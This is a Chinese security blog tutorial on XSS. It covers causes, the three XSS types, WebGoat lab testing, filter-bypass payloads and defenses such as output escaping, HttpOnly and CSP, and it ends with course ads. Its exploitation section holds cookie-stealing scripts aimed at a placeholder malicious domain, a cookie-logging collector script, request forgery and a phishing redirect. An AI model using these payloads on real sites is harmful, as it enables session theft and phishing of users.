#  第3期：Web漏洞挖掘实战｜XSS跨站脚本漏洞原理与绕过技巧  
原创 龙哥网络安全
                    龙哥网络安全  龙哥网络安全   2026-02-06 02:10  
  
![图片](https://mmbiz.qpic.cn/sz_mmbiz_jpg/8cylv3yeUGazxVH1jZeglU7dalBjsibSmd6FLrmwqrppsSUn6WibEza1bA2sMGH4X7Do73PrJe4Fn9dqxX5iaF5XFtXItibwuIZqypmnxahSNRE/640?wx_fmt=jpeg "")  
  
  
前言  
  
XSS（Cross-Site Scripting，跨站脚本漏洞）是Web漏洞中最常见的漏洞之一，其危害虽不及SQL注入直接，但可用于窃取用户Cookie、伪造用户身份、发起钓鱼攻击等，在实战安全测试与CTF竞赛中频繁出现。与SQL注入的“数据库交互漏洞”  
不同，XSS是“页面渲染漏洞”  
，核心成因是“用户输入未被过滤，直接嵌入页面HTML中，导致恶意脚本被执行”  
。  
  
本文将从底层渲染原理出发，拆解XSS的成因、分类、挖掘流程，结合OWASP WebGoat靶场实战，覆盖反射型、存储型XSS的挖掘与绕过技巧，同时补充前端/后端防护方案，兼顾理论与实操，适合Web安全新手、前端开发者、CTF爱好者阅读，需具备基础的HTML、JavaScript与HTTP协议知识。  
## 一、XSS底层原理与核心成因  
  
XSS的本质是“用户输入可控+页面未做过滤，导致恶意JavaScript脚本被浏览器执行”  
，其底层依赖浏览器的HTML渲染机制——浏览器会将页面中的HTML代码解析渲染，若用户输入的恶意脚本被当作合法HTML/JS代码解析，就会触发XSS。  
1. 漏洞代码示例（HTML+PHP）  
  
```
<!DOCTYPE html><html><body><h1>搜索结果</h1><?php// 接收用户输入的搜索关键词$keyword = $_GET['keyword'];// 直接将用户输入嵌入页面（未做过滤）echo "你搜索的关键词是：" . $keyword;?></body></html>
```  
1. XSS触发过程  
  
当用户输入正常关键词（keyword=web安全）  
时，页面渲染后显示：“你搜索的关键词是：web安全”，无异常；当用户输入恶意脚本（keyword=<script>alert('XSS')</script>）  
时，页面渲染后的HTML代码为：  
```
<!DOCTYPE html><html><body><h1>搜索结果</h1>你搜索的关键词是：<script>alert('XSS')</script></body></html>
```  
  
浏览器解析到<script>  
标签后，会执行其中的alert('XSS')  
语句，弹出弹窗，触发XSS漏洞。  
1. 核心成因总结  
  
XSS的触发需满足两个核心条件，二者缺一不可：  
- 输入可控：用户可以控制传入页面的参数（如URL参数、表单参数、Cookie、评论内容）。  
  
- 未做过滤：开发者未对用户输入的HTML/JS特殊标签（如<script>、<img>）  
、特殊字符（如<、>、"、'）进行过滤或转义，导致恶意脚本被当作合法代码渲染。  
  
> 补充说明：XSS的危害取决于恶意脚本的功能，简单的脚本仅能弹出弹窗，复杂的脚本可窃取用户Cookie（document.cookie）、伪造用户请求、跳转钓鱼页面等。  
  
## 二、XSS的核心分类（按存储与触发方式）  
  
根据恶意脚本的存储方式与触发场景，XSS可分为3类，不同类型的挖掘思路、危害范围差异较大，新手需重点掌握前两类。  
1. 反射型XSS（非持久化XSS）  
  
- 核心特征：恶意脚本不存储在服务器中，仅通过用户输入的参数（如URL参数）传递，一次性触发，刷新页面后脚本失效。  
  
- 触发场景：搜索框、登录跳转页、URL参数展示页等（用户输入直接在当前页面渲染）。  
  
- 危害等级：中，需诱导用户点击恶意URL才能触发，无法主动攻击大量用户。  
  
- 示例：http://xxx.com/search.php?keyword=<script>alert('XSS')</script>  
。  
  
1. 存储型XSS（持久化XSS）  
  
- 核心特征：恶意脚本被存储在服务器中（如数据库、文件），每次用户访问包含该脚本的页面，都会触发XSS，具有持久性。  
  
- 触发场景：评论区、留言板、个人资料编辑页、论坛发帖页等（用户输入会被存入数据库，供其他用户查看）。  
  
- 危害等级：高，一旦注入成功，所有访问该页面的用户都会被攻击，影响范围广。  
  
- 示例：在评论区输入  
  
<script>document.location.href='http://恶意域名?cookie='+document.cookie</script>  
，其他用户查看评论时，Cookie会被窃取。  
1. DOM型XSS（文档对象模型XSS）  
  
- 核心特征：漏洞存在于前端JS代码中，与后端无关，通过操作DOM元素（如document.write、innerHTML）将用户输入嵌入页面，触发脚本执行。  
  
- 触发场景：前端动态渲染页面（如通过JS获取URL参数，渲染到页面中）。  
  
- 危害等级：中-高，取决于前端渲染场景，部分DOM型XSS可绕过后端过滤。  
  
- 示例（JS代码）：  
  
// 获取URL中的keyword参数  
  
var keyword = location.search.split('=')[1];  
  
// 操作DOM，将参数嵌入页面（未做过滤）  
  
document.getElementById('search-result').innerHTML = "搜索结果：" + keyword;  
## 三、XSS标准化挖掘流程（靶场实战同步）  
  
本文以OWASP WebGoat反射型XSS题目为例，拆解“信息收集→漏洞探测→漏洞验证→漏洞利用”的完整流程，新手可跟着实操；同时补充存储型XSS的挖掘要点。  
1. 信息收集（前置步骤）  
  
- 目标信息：靶场地址（如http://webgoat.local:8080/WebGoat/XSS/reflected）  
，存在搜索框，支持用户输入关键词并显示。  
  
- 输入场景判断：用户输入的关键词会直接显示在页面中，属于反射型XSS的典型场景。  
  
- 过滤情况探测：初步输入简单脚本（<script>alert(1)</script>）  
，观察页面是否执行，判断是否存在过滤。  
  
1. 漏洞探测（核心步骤）  
  
漏洞探测的核心是“确认是否存在XSS注入点”  
，常用两种方式：手动探测与工具探测，优先手动探测（避免工具误报）。  
  
（1）手动探测（反射型XSS）  
- 步骤1：构造基础测试脚本，判断是否存在注入点：  
  
```
 # 基础弹窗脚本 http://webgoat.local:8080/WebGoat/XSS/reflected?keyword=<script>alert(1)</script># 若`<script>`标签被过滤，尝试其他标签（如img）http://webgoat.local:8080/WebGoat/XSS/reflected?keyword=<img src=x onerror=alert(1)>
```  
- 步骤2：判断过滤规则，逐步尝试绕过：  
  
- 若<script>  
被过滤，使用大小写混淆（<Script>、<SCRIPT>）  
；  
  
- 若onerror事件被过滤，使用其他事件（onload、onclick，如<img src=x onload=alert(1)>）  
；  
  
- 若<、>被过滤，使用HTML实体编码（如<编码为<，>编码为>），需判断浏览器是否会解码。  
  
- 步骤3：确认注入点：若页面弹出弹窗，说明存在反射型XSS注入点。  
  
（2）存储型XSS探测要点  
  
存储型XSS的探测流程与反射型类似，核心差异是“需确认脚本是否被存储”  
：  
- 步骤1：在评论区、留言板等场景，输入测试脚本（<img src=x onerror=alert(1)>）  
，提交内容。  
  
- 步骤2：刷新页面，或用其他账号登录查看该内容，若弹出弹窗，说明脚本被存储，存在存储型XSS。  
  
- 注意：存储型XSS需关注脚本的存储长度限制，若服务器限制输入长度，需缩短脚本（如使用精简版弹窗脚本）。  
  
（3）工具探测（Burp Suite+XSS插件）  
  
对于批量探测或复杂场景，可使用Burp Suite辅助探测，搭配XSS插件（如XSS Validator）：  
- 步骤1：开启Burp代理，抓取用户输入请求（如搜索请求、评论提交请求）。  
  
- 步骤2：将请求发送到Intruder模块，加载XSS payload字典。  
  
- 步骤3：运行攻击，查看响应结果，筛选出脚本可执行的请求，确认注入点。  
  
- 辅助工具：XSS Hunter（在线验证XSS漏洞，适合挖掘存储型XSS，可生成恶意URL，追踪脚本执行情况）。  
  
1. 漏洞利用（实战场景）  
  
XSS的利用核心是“构造恶意脚本，实现具体攻击目标”  
，实战中常见的利用场景有3种：  
  
（1）窃取用户Cookie  
  
Cookie中通常包含用户登录凭证，窃取Cookie后可伪造用户身份登录，恶意脚本示例：  
```
<script>// 将Cookie发送到恶意服务器var img = new Image();img.src = "http://恶意域名/steal.php?cookie=" + document.cookie;</script>
```  
  
恶意服务器steal.php代码（接收并存储Cookie）：  
```
<?php$cookie = $_GET['cookie'];// 将Cookie写入文件file_put_contents('cookie.txt', $cookie . "\n", FILE_APPEND);?>
```  
  
(2）伪造用户请求  
  
通过XSS脚本伪造用户的POST/GET请求，执行恶意操作（如修改密码、发布恶意内容），示例（伪造评论提交请求）：  
```
<script>// 构造POST请求，伪造用户发布恶意评论var xhr = new XMLHttpRequest();xhr.open("POST", "http://目标域名/submit_comment.php", true);xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");xhr.send("comment=恶意内容&user=当前用户");</script>
```  
  
（3）跳转钓鱼页面  
  
通过XSS脚本将页面跳转到钓鱼页面，诱导用户输入账号密码，示例：  
```
<script>// 延迟跳转，避免被用户察觉setTimeout(function(){    document.location.href = "http://钓鱼域名/login.html";}, 3000);</script>
```  
1. 漏洞验证与风险评估  
  
- 漏洞验证：反射型XSS需重复触发恶意URL，确认脚本稳定执行；存储型XSS需更换账号或刷新页面，确认脚本持续生效；DOM型XSS需验证前端JS渲染逻辑，确认脚本可被触发。  
  
- 风险评估：存储型XSS为高危，影响所有访问页面的用户；反射型、DOM型XSS为中危，需诱导用户触发；若目标为核心业务系统（如登录页、支付页），风险等级提升为高危。  
  
## 四、常见过滤绕过技巧（实战必备）  
  
实战中，开发者常会通过前端过滤、后端过滤两种方式防御XSS，新手需掌握以下5种常用绕过技巧，应对不同过滤场景。  
1. 标签与事件绕过（针对标签过滤）  
  
若开发者过滤了<script>  
标签，可使用其他支持JS执行的HTML标签+事件属性绕过，常用组合如下：  
```
# 图片标签+事件（最常用）<img src=x onerror=alert(1)>  # onerror：图片加载失败时执行<img src=1 onload=alert(1)>   # onload：图片加载成功时执行# 链接标签+事件<a href=javascript:alert(1)>点击触发</a>  # 点击链接执行<a href=x onclick=alert(1)>点击触发</a># 其他标签<body onload=alert(1)>  # 页面加载完成时执行<svg onload=alert(1)>   # SVG标签支持JS执行
```  
1. 大小写混淆绕过（针对大小写过滤）  
  
若开发者仅过滤小写标签/事件，可通过大小写混淆绕过（浏览器解析HTML时不区分大小写）：  
```
<ScRiPt>alert(1)</ScRiPt><img src=x OnErRoR=alert(1)>
```  
1. 编码绕过（针对特殊字符过滤）  
  
若开发者过滤了<、>、"、'等特殊字符，可使用HTML实体编码、URL编码绕过，需根据渲染场景选择编码方式：  
- HTML实体编码：适用于标签内容、属性值中，如<编码为<，>编码为>，'编码为'，示例：  
```
  &lt;img src=x onerror=alert(1)>
```  
  
  
- URL编码：适用于URL参数中，如<编码为%3C，>编码为%3E，示例：  
```
 http://xxx.com/search.php?keyword=%3Cimg%20src=x%20onerror=alert(1)%3E
```  
  
  
1. 注释插入绕过（针对关键字过滤）  
  
若开发者过滤了完整的关键字（如script、onerror），可在关键字中插入HTML注释，绕过过滤：  
```
<sc<!--注释-->ript>alert(1)</sc<!--注释-->ript><img src=x on<!--注释-->error=alert(1)>
```  
  
原理：服务器过滤时会匹配完整关键字，插入注释后关键字被拆分，不会被过滤；浏览器解析时会忽略注释，拼接关键字并执行。  
1. DOM型XSS绕过技巧（针对后端过滤）  
  
DOM型XSS漏洞在前端，后端过滤无效，可通过以下方式绕过前端过滤：  
- 利用前端过滤漏洞：若前端仅过滤一次，可构造重复关键字（如<sscriptcript>）  
，过滤后还原为<script>  
；  
  
- 使用JS编码：将恶意脚本进行Unicode编码，前端JS解析时会自动解码执行，示例：  
```
  // alert(1)的Unicode编码 \u0061\u006C\u0065\u0072\u0074(1);
```  
  
  
## 五、XSS防护方案（攻防兼备）  
  
XSS防护需兼顾前端与后端，核心思路是过滤输入、净化输出，结合以下3种方案，可有效防御绝大多数XSS漏洞。  
1. 后端过滤与转义（核心防护）  
  
后端过滤是最有效的防护方式，需对所有用户输入进行严格过滤或转义，推荐使用编程语言自带的转义函数：  
- PHP：使用htmlspecialchars()函数，将特殊字符转义为HTML实体，示例：  
```
  $keyword = htmlspecialchars($_GET['keyword'], ENT_QUOTES);  # ENT_QUOTES：转义单引号和双引号echo "你搜索的关键词是：" . $keyword;
```  
  
  
- Java：使用Apache Commons Lang3的StringEscapeUtils.escapeHtml4()函数，转义HTML特殊字符；  
  
- 前端：使用DOMPurify库，净化用户输入的HTML内容，避免DOM型XSS。  
  
1. 前端过滤（辅助防护）  
  
前端过滤可拦截简单的恶意脚本，提升用户体验，但不能作为核心防护（前端代码可被篡改）：  
- 过滤特殊标签与事件：禁止用户输入<script>、<img>  
等标签，以及onerror、onclick等事件属性；  
  
- 限制输入长度：对评论、搜索关键词等输入进行长度限制，减少恶意脚本的注入空间。  
  
1. 其他防护措施  
  
- 设置Cookie属性：为Cookie添加HttpOnly属性（禁止JS读取Cookie）、Secure属性（仅HTTPS传输），防止Cookie被窃取；  
  
- 启用CSP（内容安全策略）：通过HTTP响应头Content-Security-Policy，限制页面加载的脚本来源，禁止执行内联脚本，示例：  
```
  Content-Security-Policy: default-src 'self'  # 仅允许加载自身域名的资源
```  
  
  
## 六、新手避坑指南（核心5点）  
- 避坑1：认为“弹窗即XSS”，忽视实战利用价值。部分场景下，弹窗仅能证明存在注入点，但无法执行恶意脚本（如CSP拦截），需验证脚本的实际执行能力。  
  
- 避坑2：仅关注后端过滤，忽视DOM型XSS。后端过滤对DOM型XSS无效，需重点排查前端JS渲染逻辑。  
  
- 避坑3：过度依赖工具，忽视手动绕过。实战中过滤规则多样，工具无法覆盖所有绕过场景，手动构造payload是必备能力。  
  
- 避坑4：混淆编码场景，盲目使用编码绕过。不同渲染场景（标签内容、URL参数）适配不同编码方式，编码错误会导致注入失败。  
  
- 避坑5：忽视CSP防护。实战中很多目标会启用CSP，需先探测CSP规则，再选择对应的绕过方法（如利用可信脚本来源注入）。  
  
## 七、总结与下期预告  
  
本文拆解了XSS跨站脚本漏洞的底层原理、核心分类、标准化挖掘流程与实战绕过技巧，结合OWASP WebGoat靶场完成实操，核心要点是“理解页面渲染机制，掌握输入过滤与输出净化的攻防逻辑”。XSS的挖掘核心不是背诵payload，而是根据过滤规则灵活构造脚本，同时兼顾防护方案，形成攻防兼备的能力。  
  
下期预告：将聚焦Web漏洞挖掘的进阶场景，拆解文件上传与文件包含漏洞的底层原理、挖掘流程、组合利用技巧，结合CTFshow靶场实战，教大家如何通过这两类漏洞直接getshell，敬请关注！  
  
全是能直接用的干货：点击链接就能拿到！  
  
[有了这个资源，网安技术学不会你找我！](https://mp.weixin.qq.com/s?__biz=MzU3MjczNzA1Ng==&mid=2247499507&idx=1&sn=b3342a568d226df231f7a371f8e5a0d5&scene=21#wechat_redirect)  
  
  
  
想要入行黑客&网络安全的朋友，给大家准备了一份：282G全网最全的网络安全资料包免费领取。  
  
  
关注我，到我公众呺主页发送“学习”或者“黑客”，就能领取到视频教程，我都可以免费分享给大家哦！  
  
![图片](https://mmbiz.qpic.cn/mmbiz_gif/7O8nPRxfRT6lk3oXDrx8qaZiaMDS5XHTATLezRmc0A6yBIw1wmpib4hbgAiaK7CmtV0jMMle98QxC74LPEQhjzqOw/640?wx_fmt=gif&tp=webp&wxfrom=5&wx_lazy=1#imgIndex=4 "")  
  
从0到进阶的全套网安教程  
  
[有了这个资源，网安技术学不会你找我！](https://mp.weixin.qq.com/s?__biz=MzU3MjczNzA1Ng==&mid=2247499507&idx=1&sn=b3342a568d226df231f7a371f8e5a0d5&scene=21#wechat_redirect)  
  
  
  
可以截图或者直接扫码添加找我拿  
  
**龙哥网络安全**  
  
  
![图片](https://mmbiz.qpic.cn/mmbiz_jpg/7O8nPRxfRT6lk3oXDrx8qaZiaMDS5XHTAUZJyk54VZ9YhKV0EQEpCETOEEibrhIBGbJgGS8o1ZqGweicPrIcMh5LQ/640?wx_fmt=jpeg&tp=webp&wxfrom=5&wx_lazy=1#imgIndex=5 "")  
  
  
**扫码添加领取**  
  
  
**点击蓝字**  
  
![图片](https://mmbiz.qpic.cn/sz_mmbiz_png/ibxqJibmt337FAiaWRcQtUgyiak5dz81n37puYvXjff5AofqGAkjClzzyg4jcUgDucuKloOlGmF8ibYqYQeNHecpezA/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1#imgIndex=6 "")  
  
**关注我**  
  
[#黑客技术]()  
[#挖漏洞]()  
[#技术分享]()  
[#网络工程师]()  
[#零基础小白学黑客技术]()  
[#信息安全]()  
[#CTF]()  
[#网安技术]()  
[#计算机专业]()  
[#转行网络安全]()  
  
  
